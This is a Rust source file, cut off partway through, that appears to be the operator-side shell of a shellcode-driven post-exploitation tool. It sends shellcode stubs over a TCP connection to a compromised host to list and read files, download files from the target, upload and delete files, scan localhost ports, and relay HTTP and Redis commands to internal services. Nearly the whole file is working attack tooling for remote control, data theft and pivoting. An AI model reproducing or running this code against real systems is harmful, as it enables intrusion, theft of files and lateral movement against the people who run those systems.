use std::{io::{self, Write, Read}, error::Error, fs::File, path::Path};

use colored::Colorize;
use errno::Errno;

use crate::{util::{print_failed, print_success, colorized_file, close_connection, print_error, gen_random_filename, read_bytes_from_file, print_warning}, config::Config, shellcode::{SYS_GETUID_GETUID_SENDER, SYS_GETGID_GETGID_SENDER, SHELLCODE_LEN, OPEN_DIR_SENDER, OPEN_CAT_SENDER, CD_SENDER, PWD_SENDER, TCP_PORT_SCANNER, UPLOAD_SENDER, RM_SENDER, MV_SENDER, MKDIR_SENDER, RMDIR_SENDER, NETCAT_ESCAPER, CP_SENDER}};

fn help() {
    println!(
        "
    Core Commands
    =============

        Command                    Description                                    Syscalls
        -------                    -------                                        -----------
        help                       Print This Menu                                N/A
        ls [DIR]                   List Directory                                 SYS_open, SYS_getdents
        dir [DIR]                  List Directory                                 SYS_open, SYS_getdents
        cat <FILE>                 Print File Content                             SYS_open, SYS_close
        cd <DIR>                   Change Directory                               SYS_chdir
        pwd                        Print Current Directory                        SYS_getcwd
        download <FILE>            Download File                                  SYS_open, SYS_close
        upload <FILE> [PERM]       Upload File                                    SYS_open, SYS_close
        rm <FILE>                  Remove File                                    SYS_unlink
        mv <SOURCE> <DEST>         Move File                                      SYS_rename
        cp <SOURCE> <DEST> [PERM]  Copy File                                      SYS_open, SYS_close
        mkdir <DIR> [PERM]         Create a directory                             SYS_mkdir
        rmdir <DIR>                Remove a directory                             SYS_rmdir
        getuid                     Get Current UID                                SYS_getuid
        getgid                     Get Current GID                                SYS_getgid
        portscan                   Scan Ports on localhost                        SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
        netcat <INPUT_FILE> <Port> Send Data in the Input File to Port            SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
                                   and Receive Output
        http                       HTTP shell                                     SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
        redis                      Redis shell                                    SYS_socket, SYS_setsockopt, SYS_connect, SYS_close
        exit                       Exit shell                                     N/A
        quit                       Exit shell                                     N/A
"
    );
}

fn dir(config: &Config, verbose: bool, directory: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if directory.len() >= 0xffff {
        return Err("dir: file name too long".into());
    }
    let dir_name_len = (directory.len() + 1) as u16; // include null byte
    let dir_sender = OPEN_DIR_SENDER;

    let mut shellcode = dir_sender.shellcode.to_vec();
    let dir_len_index_bytes = dir_name_len.to_le_bytes();
    for i in 0..2 {
        shellcode[dir_sender.dir_len_index + i] = dir_len_index_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(directory.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);

    if beacon < 0 {
        let errno = -beacon;
        /* Not a directory: print the file directly */
        if errno == 20 {
            if verbose {
                let message = format!("Listing file '{}'", directory);
                print_success(&message);
            }
            println!("{}", directory);
            return Ok(());
        }
        let message = format!("dir: cannot access '{}': {}", directory, Errno(errno as i32));
        return Err(message.into());
    }

    let struct_len = beacon as u64;
    let mut index: u64 = 0;

    let mut result = String::new();

    while index < struct_len {
        /* inode not important here */
        let mut _d_ino_buff = [0; 8];
        conn.read_exact(&mut _d_ino_buff)?;
        let _d_ino = u64::from_le_bytes(_d_ino_buff);

        /* d_off not important here */
        let mut _d_off_buff = [0; 8];
        conn.read_exact(&mut _d_off_buff)?;
        let _d_off = u64::from_le_bytes(_d_off_buff);
        
        let mut d_reclen_buff = [0; 2];
        conn.read_exact(&mut d_reclen_buff)?;
        let d_reclen = u16::from_le_bytes(d_reclen_buff);

        let mut file_name_buff = vec![0; (d_reclen - 0x13) as usize];
        conn.read_exact(&mut file_name_buff)?;

        /* Remove redundant null bytes */
        file_name_buff = file_name_buff.into_iter().take_while(|&x| x != 0).collect();

        let file_name = String::from_utf8_lossy(&file_name_buff).to_string();

        let mut d_type_buff = [0; 1];
        conn.read_exact(&mut d_type_buff)?;
        let d_type = u8::from_le_bytes(d_type_buff);

        let file_name_colored = colorized_file(&file_name, d_type);
        result.push_str(&file_name_colored);
        result.push('\n');

        index += d_reclen as u64;
    }

    if verbose {
        let message = format!("Listing directory '{}'", directory);
        print_success(&message);
    }

    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();
    write!(stdout_handle, "{}", result)?;

    Ok(())
}

fn cat(config: &Config, verbose: bool, file_name: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if file_name.len() >= 0xffff {
        return Err("cat: file name too long".into());
    }
    let file_name_len = (file_name.len() + 1) as u16; // include null byte
    let cat_sender = OPEN_CAT_SENDER;
    let mut shellcode = cat_sender.shellcode.to_vec();
    let file_len_index_bytes = file_name_len.to_le_bytes();
    for i in 0..2 {
        shellcode[cat_sender.file_len_index + i] = file_len_index_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(file_name.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    let mut file_content_buff = Vec::new();
    loop {
        conn.read_exact(&mut beacon_buff)?;
        let beacon = i64::from_le_bytes(beacon_buff);
        if beacon == 0 {
            break;
        }
        if beacon < 0 {
            let errno = -beacon;
            let message = format!("cat: cannot access '{}': {}", file_name, Errno(errno as i32));
            return Err(message.into());
        }
        let chunk_len = beacon as u64;
        let mut chunk_buff = vec![0; chunk_len as usize];
        conn.read_exact(&mut chunk_buff)?;
        file_content_buff.extend(chunk_buff);
    }

    if verbose {
        let message = format!("Printing file '{}'", file_name);
        print_success(&message);
    }

    let file_content = String::from_utf8_lossy(&file_content_buff).to_string();

    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();
    write!(stdout_handle, "{}", file_content)?;

    Ok(())
}

fn cd(config: &Config, verbose: bool, file: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if file.len() >= 0xffff {
        return Err("cd: file name too long".into());
    }
    let file_name_len = (file.len() + 1) as u16;
    let cd_sender = CD_SENDER;
    let mut shellcode = cd_sender.shellcode.to_vec();
    let file_len_index_bytes = file_name_len.to_le_bytes();
    for i in 0..2 {
        shellcode[cd_sender.file_len_index + i] = file_len_index_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(file.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);
    if beacon < 0 {
        let errno = -beacon;
        let message = format!("cd: cannot access '{}': {}", file, Errno(errno as i32));
        return Err(message.into());
    }

    if verbose {
        let message = format!("Directory changed to '{}'", file);
        print_success(&message);
    }

    Ok(())
}

fn pwd(config: &Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let pwd_sender = PWD_SENDER;
    let mut pwd_shellcode = pwd_sender.shellcode.to_vec();
    pwd_shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&pwd_shellcode)?;

    let mut cwd_len_buff = [0; 8];
    conn.read_exact(&mut cwd_len_buff)?;
    let cwd_len = i64::from_le_bytes(cwd_len_buff);

    let mut cwd_buff = vec![0; cwd_len as usize];
    conn.read_exact(&mut cwd_buff)?;
    cwd_buff.pop(); // remove trailing null byte
    let cwd = String::from_utf8_lossy(&cwd_buff).to_string();

    println!("{}", cwd);

    Ok(())
}


fn download(config: &Config, file_name: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if file_name.len() >= 0xffff {
        return Err("download: file name too long".into());
    }
    let file_name_len = (file_name.len() + 1) as u16; // include null byte
    let download_sender = OPEN_CAT_SENDER; // use cat sender because the shellcode is the same
    let mut shellcode = download_sender.shellcode.to_vec();
    let file_len_index_bytes = file_name_len.to_le_bytes();
    for i in 0..2 {
        shellcode[download_sender.file_len_index + i] = file_len_index_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(file_name.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    let mut file_content_buff = Vec::new();
    loop {
        conn.read_exact(&mut beacon_buff)?;
        let beacon = i64::from_le_bytes(beacon_buff);
        if beacon == 0 {
            break;
        }
        if beacon < 0 {
            let errno = -beacon;
            let message = format!("download: cannot access '{}': {}", file_name, Errno(errno as i32));
            return Err(message.into());
        }
        let chunk_len = beacon as u64;
        let mut chunk_buff = vec![0; chunk_len as usize];
        conn.read_exact(&mut chunk_buff)?;
        file_content_buff.extend(chunk_buff);
    }

    let original_file_path = Path::new(file_name);
    let original_file_name = original_file_path.file_name().unwrap_or_default().to_string_lossy();
    let stored_file_name = gen_random_filename(&original_file_name);
    let mut stored_file = File::create(&stored_file_name)?;
    stored_file.write_all(&file_content_buff)?;
    let message = format!("Downloaded file stored to '{}'", &stored_file_name);
    print_success(&message);

    Ok(())
}

fn upload(config: &Config, file_name: &str, perm: u16) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if file_name.len() >= 0xffff {
        return Err("upload: file name too long".into());
    }

    let mut original_file: File;
    match File::open(file_name) {
        Ok(f) => {
            original_file = f;
        },
        Err(err) => {
            let message = format!("upload: cannot access local file '{}': {}", file_name, err);
            return Err(message.into());
        }
    }
    let original_file_path = Path::new(file_name);
    let original_file_name = original_file_path.file_name().unwrap_or_default().to_string_lossy();
    let upload_file_name = gen_random_filename(&original_file_name);
    let upload_file_name_len = (upload_file_name.len() + 1) as u16;

    let mut file_content_buff = Vec::new();
    original_file.read_to_end(&mut file_content_buff)?;

    let upload_sender = UPLOAD_SENDER;
    let mut shellcode = upload_sender.shellcode.to_vec();

    let upload_file_len_index_bytes = upload_file_name_len.to_le_bytes();
    let perm_bytes = perm.to_le_bytes();
    for i in 0..2 {
        shellcode[upload_sender.file_len_index + i] = upload_file_len_index_bytes[i];
        shellcode[upload_sender.perm_index + i] = perm_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(upload_file_name.as_bytes())?;
    conn.write(&[0])?;

    let mut index = 0;
    let file_content_len = file_content_buff.len();
    loop {
        let remain_len = file_content_len - index;
        let write_size = if remain_len < 0x1000 { remain_len } else { 0x1000 };
        let write_size_buff = write_size.to_le_bytes();
        conn.write(&write_size_buff)?;
        if write_size == 0 {
            break;
        }
        let partial_data = &file_content_buff[index..(index + write_size)];
        conn.write(&partial_data)?;
        index += write_size;
    }

    let message = format!("Upload '{}' to '{}'", file_name, upload_file_name);
    print_success(&message);

    Ok(())
}

fn rm(config: &Config, verbose: bool, file_name: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if file_name.len() >= 0xffff {
        return Err("rm: file name too long".into());
    }
    let file_name_len = (file_name.len() + 1) as u16;
    let rm_sender = RM_SENDER;
    let mut shellcode = rm_sender.shellcode.to_vec();

    let file_len_index_bytes = file_name_len.to_le_bytes();
    for i in 0..2 {
        shellcode[rm_sender.file_len_index + i] = file_len_index_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(file_name.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);
    if beacon < 0 {
        let errno = -beacon;
        let message = format!("rm: cannot access '{}': {}", file_name, Errno(errno as i32));
        return Err(message.into());
    }

    if verbose {
        let message = format!("File '{}' removed", file_name);
    print_success(&message);

    }
    
    Ok(())
}

pub fn mv(config: &Config, verbose: bool, source_file_name: &str, dest_file_name: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if source_file_name.len() >= 0xffff {
        return Err("mv: source file name too long".into());
    }
    if dest_file_name.len() >= 0xffff {
        return Err("mv: source file name too long".into());
    }

    let source_file_name_len = (source_file_name.len() + 1) as u16;
    let dest_file_name_len = (dest_file_name.len() + 1) as u16;
    let mv_sender = MV_SENDER;
    let mut shellcode = mv_sender.shellcode.to_vec();
    let source_file_name_len_bytes = source_file_name_len.to_le_bytes();
    let dest_file_name_len_bytes = dest_file_name_len.to_le_bytes();
    for i in 0..2 {
        shellcode[mv_sender.source_file_len_index + i] = source_file_name_len_bytes[i];
        shellcode[mv_sender.dest_file_len_index + i] = dest_file_name_len_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(source_file_name.as_bytes())?;
    conn.write(&[0])?;
    conn.write(dest_file_name.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);
    if beacon < 0 {
        let errno = -beacon;
        if errno == 18 {
            cp(config, false, source_file_name, dest_file_name, 0o755)?;
            rm(config, false, source_file_name)?;
            if verbose {
                let message = format!("Successfully move '{}' to '{}'", source_file_name, dest_file_name);
                print_success(&message);
            }
            return Ok(());
        }
        let message = format!("mv: cannot access '{}' or '{}': {}", source_file_name, dest_file_name, Errno(errno as i32));
        return Err(message.into());
    }

    if verbose {
        let message = format!("Successfully move '{}' to '{}'", source_file_name, dest_file_name);
        print_success(&message);
    }

    Ok(())
}

pub fn cp(config: &Config, verbose: bool, source_file_name: &str, dest_file_name: &str, perm: u16) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if source_file_name.len() >= 0xffff {
        return Err("cp: source file name too long".into());
    }
    if dest_file_name.len() >= 0xffff {
        return Err("cp: source file name too long".into());
    }

    let source_file_name_len = (source_file_name.len() + 1) as u16;
    let dest_file_name_len = (dest_file_name.len() + 1) as u16;
    let cp_sender = CP_SENDER;
    let mut shellcode = cp_sender.shellcode.to_vec();
    let source_file_name_len_bytes = source_file_name_len.to_le_bytes();
    let dest_file_name_len_bytes = dest_file_name_len.to_le_bytes();
    let perm_bytes = perm.to_le_bytes();
    for i in 0..2 {
        shellcode[cp_sender.source_file_len_index + i] = source_file_name_len_bytes[i];
        shellcode[cp_sender.dest_file_len_index + i] = dest_file_name_len_bytes[i];
        shellcode[cp_sender.perm_index + i] = perm_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(source_file_name.as_bytes())?;
    conn.write(&[0])?;
    conn.write(dest_file_name.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);
    if beacon < 0 {
        let errno = -beacon;
        let message = format!("cp: cannot access '{}' or '{}': {}", source_file_name, dest_file_name, Errno(errno as i32));
        return Err(message.into());
    }

    if verbose {
        let message = format!("Successfully copy '{}' to '{}'", source_file_name, dest_file_name);
        print_success(&message);
    }

    Ok(())
}

fn mkdir(config: &Config, verbose: bool, dir_name: &str, perm: u16) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if dir_name.len() >= 0xffff {
        return Err("mkdir: file name too long".into());
    }
    let dir_name_len = (dir_name.len() + 1) as u16;
    let mkdir_sender = MKDIR_SENDER;
    let mut shellcode = mkdir_sender.shellcode.to_vec();
    let dir_name_len_bytes = dir_name_len.to_le_bytes();
    let perm_bytes = perm.to_le_bytes();
    for i in 0..2 {
        shellcode[mkdir_sender.dir_len_index + i] = dir_name_len_bytes[i];
        shellcode[mkdir_sender.perm_index + i] = perm_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(dir_name.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);
    if beacon < 0 {
        let errno = -beacon;
        let message = format!("mkdir: cannot access '{}': {}", dir_name, Errno(errno as i32));
        return Err(message.into());
    }

    if verbose {
        let message = format!("Directory '{}' created", dir_name);
        print_success(&message);
    }

    Ok(())
}

fn rmdir(config: &Config, verbose: bool, dir_name: &str) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    if dir_name.len() >= 0xffff {
        return Err("rmdir: file name too long".into());
    }
    let dir_name_len = (dir_name.len() + 1) as u16;
    let rmdir_sender = RMDIR_SENDER;
    let mut shellcode = rmdir_sender.shellcode.to_vec();
    let dir_name_len_bytes = dir_name_len.to_le_bytes();
    for i in 0..2 {
        shellcode[rmdir_sender.file_len_index + i] = dir_name_len_bytes[i];
    }    
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(dir_name.as_bytes())?;
    conn.write(&[0])?;

    let mut beacon_buff = [0; 8];
    conn.read_exact(&mut beacon_buff)?;
    let beacon = i64::from_le_bytes(beacon_buff);
    if beacon < 0 {
        let errno = -beacon;
        let message = format!("rmdir: cannot access '{}': {}", dir_name, Errno(errno as i32));
        return Err(message.into());
    }

    if verbose {
        let message = format!("Directory '{}' removed", dir_name);
        print_success(&message);
    }

    Ok(())
}

fn getuid(config: &Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let getuid_sender = SYS_GETUID_GETUID_SENDER;
    let mut getuid_shellcode = getuid_sender.shellcode.to_vec();
    getuid_shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&getuid_shellcode)?;

    let mut uid_buff = [0; 8];
    conn.read_exact(&mut uid_buff)?;
    let uid = i64::from_le_bytes(uid_buff);

    println!("{}", uid);

    Ok(())
}

fn getgid(config: &Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }
    let getgid_sender = SYS_GETGID_GETGID_SENDER;
    let mut getgid_shellcode = getgid_sender.shellcode.to_vec();
    getgid_shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn: &std::net::TcpStream = config.conn.as_ref().unwrap();
    conn.write(&getgid_shellcode)?;

    let mut gid_buff = [0; 8];
    conn.read_exact(&mut gid_buff)?;
    let gid = i64::from_le_bytes(gid_buff);

    println!("{}", gid);

    Ok(())
}

fn exit() -> Result<bool, Box<dyn Error>> {
    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();
    loop {
        let mut line = String::new();
        let quote = "Exit server? (y/n)> ".bold();
        write!(stdout_handle, "{}", quote)?;
        stdout_handle.flush()?;
        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read != 0 {
            let first_char = line.chars().nth(0).unwrap();
            if first_char == 'y' {
                return Ok(true);
            } else if first_char == 'n' {
                return Ok(false);
            }
        }
    }
}

pub fn portscan(config: &mut Config) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }

    let tcp_scanner = TCP_PORT_SCANNER;
    let mut tcp_scanner_shellcode = tcp_scanner.shellcode.to_vec();
    tcp_scanner_shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&tcp_scanner_shellcode)?;

    let mut open_port_num_buff = [0; 8];
    conn.read_exact(&mut open_port_num_buff)?;
    let open_port_num = i64::from_le_bytes(open_port_num_buff);

    let mut open_ports = Vec::new();
    for _ in 0..open_port_num {
        let mut open_port_buff = [0; 2];
        conn.read_exact(&mut open_port_buff)?;
        let open_port = u16::from_le_bytes(open_port_buff);
        open_ports.push(open_port);
    }

    let open_ports_str = open_ports.iter().map(|&x| x.to_string()).collect::<Vec<String>>().join(", ");
    let message = format!("Open ports: {}", open_ports_str);
    print_success(&message);

    Ok(())
}

fn netcat(config: &Config, verbose: bool, payload: &[u8], port: u16) -> Result<(), Box<dyn Error>> {
    if config.conn.is_none() {
        return Err("Server not connected".into());
    }

    let payload_len = payload.len();
    let upload_escaper = NETCAT_ESCAPER;
    let mut shellcode = upload_escaper.shellcode.to_vec();
    let port_bytes = port.to_be_bytes();
    let payload_len_bytes = payload_len.to_le_bytes();
    for i in 0..2 {
        shellcode[upload_escaper.port_index + i] = port_bytes[i];
    }
    for i in 0..4 {
        shellcode[upload_escaper.payload_length_index0 + i] = payload_len_bytes[i];
        shellcode[upload_escaper.payload_length_index1 + i] = payload_len_bytes[i];
    }
    shellcode.resize(SHELLCODE_LEN, 0);

    let mut conn = config.conn.as_ref().unwrap();
    conn.write(&shellcode)?;
    conn.write(&payload)?;

    let mut beacon_buff = [0; 8];
    let mut content_buff = Vec::new();
    loop {
        conn.read_exact(&mut beacon_buff)?;
        let beacon = i64::from_le_bytes(beacon_buff);
        if beacon == 0 {
            break;
        }
        if beacon < 0 {
            let errno = -beacon;
            let message = format!("netcat: unexpected error: {}", Errno(errno as i32));
            return Err(message.into());
        }
        let chunk_len = beacon as u64;
        let mut chunk_buff = vec![0; chunk_len as usize];
        conn.read_exact(&mut chunk_buff)?;
        content_buff.extend(chunk_buff);
    }

    if verbose {
        let file_content = String::from_utf8_lossy(&content_buff).to_string();
        println!("{}", file_content);
    }

    Ok(())
}

fn http_help() {
    println!("
    Usage: <HTTP_METHOD> <HTTP_PATH> [<HTTP_QUERY>|<POST_DATA>] | exit | quit
    Examples:
        GET index.html
        GET index.php q=1&p=home
        POST index.php id=johndoe&role=admin
        exit
    ");
}

pub fn http(config: &mut Config, port: u16) -> Result<(), Box<dyn Error>> {
    let ps = "http> ".bold();

    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();

    print_warning("This module is used to send simple HTTP requests");
    print_warning("If you want to send complex HTTP requests, consider using the 'netcat' command");

    loop {
        let mut line = String::new();

        write!(stdout_handle, "{}", ps)?;
        stdout_handle.flush()?;

        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read == 0 {
            break;
        }

        let mut iter = line.trim().split_whitespace();
        if let Some(method) = iter.next() {
            match method {
                "help" => {
                    http_help();
                    continue;
                },
                "exit" | "quit" => {
                    break;
                },
                "GET" | "POST" => {
                    if let Some(http_path) = iter.next() {
                        let query = match iter.next() {
                            Some(query) => {
                                query
                            },
                            None => {
                                ""
                            }
                        };
                        let http_request_str = if method == "GET" {
                            if query.is_empty() {
                                format!("GET /{} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n", http_path)
                            } else {
                                format!("GET /{}?{} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n", http_path, query)
                            }
                        } else {
                            format!("POST /{} HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}\r\n\r\n", http_path, query.len(), query)
                        };
                        println!("{}", http_request_str);
                        let http_request = http_request_str.as_bytes();
                        netcat(config, true, &http_request, port)?;
                    } else {
                        print_failed("Error: no path specified");
                    }
                },
                _ => {
                    let message = format!("Error: unsupported method {}", method);
                    print_failed(&message);
                    print_warning("If you want to send complex HTTP requests, consider using the 'netcat' command");
                    http_help();
                    continue
                }
            };
        }
    }

    println!("");
    Ok(())
}

pub fn redis(config: &mut Config, port: u16) -> Result<(), Box<dyn Error>> {
    let ps = "redis> ".bold();

    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();

    let set_timeout = "*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$7\r\ntimeout\r\n$1\r\n1\r\n".as_bytes();
    netcat(config, false, &set_timeout, port)?;   

    loop {
        let mut line = String::new();

        write!(stdout_handle, "{}", ps)?;
        stdout_handle.flush()?;

        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read == 0 {
            break;
        }
        let cmds: Vec<&str> = line.trim().split_whitespace().collect();
        if cmds[0] == "exit" || cmds[0] == "quit" {
            break;
        }

        let mut payload_str = String::new();
        payload_str.push('*');
        let cmds_len_str = cmds.len().to_string();
        payload_str.push_str(&cmds_len_str);
        payload_str.push_str("\r\n");
        for cmd in cmds {
            payload_str.push('$');
            let cmd_len_str = cmd.len().to_string();
            payload_str.push_str(&cmd_len_str);
            payload_str.push_str("\r\n");
            payload_str.push_str(cmd);
            payload_str.push_str("\r\n");
        }

        /* Small hack: set timeout to 1 every time  */
        let payload = payload_str.as_bytes();
        netcat(config, true, &payload, port)?;
    }

    println!("");
    Ok(())
}

pub fn prompt(config: &mut Config) -> Result<(), Box<dyn Error>> {
    let ps = "$ ".bold();

    let stdin = io::stdin();
    let stdout = io::stdout();
    let mut stdout_handle = stdout.lock();

    loop {
        let mut line = String::new();

        write!(stdout_handle, "{}", ps)?;
        stdout_handle.flush()?;

        let bytes_read = stdin.read_line(&mut line)?;
        if bytes_read == 0 {
            if let Ok(want_exit) = exit() {
                if want_exit {
                    close_connection(config);
                    break;
                }
            } else {
                /* Close the connection in case things go wrong */
                /* Probably not a good idea here, but I'll fix this later */
                close_connection(config);
                break;
            }
        }
        let mut iter = line.trim().split_whitespace();
        if let Some(command) = iter.next() {
            match command {
                "help" => {
                    help();
                },
                "ls" | "dir" => {
                    let file_name = match iter.next() {
                        Some(file_name) => file_name,
                        None => ".",
                    };
                    if let Err(err) = dir(config, true, file_name) {
                        print_error(err);
                    }
                },
                "cat" | "type" => {
                    if let Some(file_name) = iter.next() {
                        if let Err(err) = cat(config, true, file_name) {
                            print_error(err);
                        }
                    } else {
                        print_failed("Error: cat: no file specified")
                    }
                },
                "cd" => {
                    if let Some(file_name) = iter.next() {
                        if let Err(err) = cd(config, true, file_name) {
                            print_error(err);
                        }
                    }
                },
                "pwd" => {
                    if let Err(err) = pwd(config) {
                        print_error(err);
                    }
                },
                "download" => {
                    if let Some(file_name) = iter.next() {
                        if let Err(err) = download(config, file_name) {
                            print_error(err);
                        }
                    } else {
                        print_failed("Error: download: no file specified")
                    }
                },
                "upload" => {
                    if let Some(file_name) = iter.next() {
                        let perm_option = match iter.next() {
                            Some(perm_str) => {
                                if let Ok(perm) = u16::from_str_radix(perm_str, 8) {
                                    Some(perm)
                                } else {
                                    None
                                }
                            },
                            None => { Some(0o644) },
                        };
                        if let Some(perm) = perm_option {
                            if let Err(err) = upload(config, file_name, perm) {
                                print_error(err);
                            }
                        } else {
                            print_failed("Error: upload: invalid permission")
                        }
                        
                    } else {
                        print_failed("Error: upload: no file specified")
                    }
                },
                "rm" => {
                    if let Some(file_name) = iter.next() {
                        if let Err(err) = rm(config, true, file_name) {
                            print_error(err);
                        }
                    } else {
                        print_failed("Error: rm: no file specified");
                    }
                },
                "mv" => {
                    if let Some(source_file_name) = iter.next() {
                        if let Some(dest_file_name) = iter.next() {
                            if let Err(err) = mv(config, true, source_file_name, dest_file_name) {
                                print_error(err);
                            }
                        } else {
                            print_failed("Error: mv: no destination file specified");
                        }
                    } else {
                        print_failed("Error: mv: no source file specified");
                    }
                },
                "cp" => {
                    if let Some(source_file_name) = iter.next() {
                        if let Some(dest_file_name) = iter.next() {
                            let perm_option = match iter.next() {
                                Some(perm_str) => {
                                    if let Ok(perm) = u16::from_str_radix(perm_str, 8) {
                                        Some(perm)
                                    } else {
                                        None
                                    }
                                },
                                None => { Some(0o644) },
                            };
                            if let Some(perm) = perm_option {
                                if let Err(err) = cp(config, true, source_file_name, dest_file_name, perm) {
                                    print_error(err);
                                }
                            } else {
                                print_failed("Error: upload: invalid permission")
                            }
                        } else {
                            print_failed("Error: cp: no destination file specified");
                        }
                    } else {
                        print_failed("Error: cp: no source file specified");
                    }
                },
                "mkdir" => {
                    if let Some(file_name) = iter.next() {
                        let perm_option = match iter.next() {
                            Some(perm_str) => {
                                if let Ok(perm) = u16::from_str_radix(perm_str, 8) {
                                    Some(perm)
                                } else {
                                    None
                                }
                            },
                            None => { Some(0o755) },
                        };
                        if let Some(perm) = perm_option {
                            if let Err(err) = mkdir(config, true, file_name, perm) {
                                print_error(err);
                            }
                        } else {
                            print_failed("Error: mkdir: invalid permission")
                        }
                    } else {
                        print_failed("Error: mkdir: no file specified");
                    }
                },
                "rmdir" => {
                    if let Some(file_name) = iter.next() {
                        if let Err(err) = rmdir(config, true, file_name) {
                            print_error(err);
                        }
                    } else {
                        print_failed("Error: rmdir: no file specified");
                    }
                },
                "getuid" => {
                    if let Err(err) = getuid(config) {
                        print_error(err);
                    }
                },
                "getgid" => {
                    if let Err(err) = getgid(config) {
                        print_error(err);
                    }
                },
                "portscan" => {
                    if let Err(err) = portscan(config) {
                        print_error(err);
                    }
                },
                "netcat" => {
                    if let Some(file_name) = iter.next() {
                        match read_bytes_from_file(file_name) {
                            Ok(data) => {
                                if let Some(port_str) = iter.next() {
                                    if let Ok(port) = port_str.parse::<u16>() {
                                        if let Err(err) = netcat(config, true, &data, port) {
                                            print_error(err);
                                        }
                                    } else {
                                        let message = format!("Error: netcat: invalid port {}", port_str);
                                        print_failed(&message);
                                    }
                                } else {
                                    print_failed("Error: netcat: no port specified");
                                }
                            },
                            Err(err) => {
                                print_error(err);
                            }
                        }
                    } else {
                        print_failed("Error: netcat: no input file specified");
                    }
                },
                "redis" => {
